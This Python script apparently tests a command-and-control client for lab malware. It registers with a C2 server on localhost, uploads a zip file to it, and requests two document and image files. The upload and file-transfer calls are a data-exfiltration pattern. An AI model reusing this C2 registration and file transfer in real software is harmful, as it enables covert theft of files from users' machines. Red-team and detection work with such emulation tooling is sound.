
import os
import time
import c2Client 
dirpath = os.path.dirname(__file__)

class malwareTest(object):

    def __init__(self) -> None:
        self.malwareID = 'testMalware'
        c2Ipaddr = '127.0.0.1'
        malownIP = '192.168.50.11'
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, ownIP=malownIP)
        self.c2Connector.registerToC2()
        self.c2Connector.start()

    def run(self):
        time.sleep(10)
        # test transfer file to C2
        print("upload file")
        filePath = os.path.join(dirpath, "update_installer.zip")
        self.c2Connector.transferFiles([filePath], uploadFlg=True)
        time.sleep(1)
        self.c2Connector.transferFiles(['2023-12-13_100327.png','NCL_SGX Service.docx'], 
                                       uploadFlg=False)

    def stop(self):
        self.c2Connector.stop()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = malwareTest()
    time.sleep(1)
    client.run()
    for i in range(10):
        time.sleep(1)
        print(i)
    client.stop()

if __name__ == '__main__':
    main()
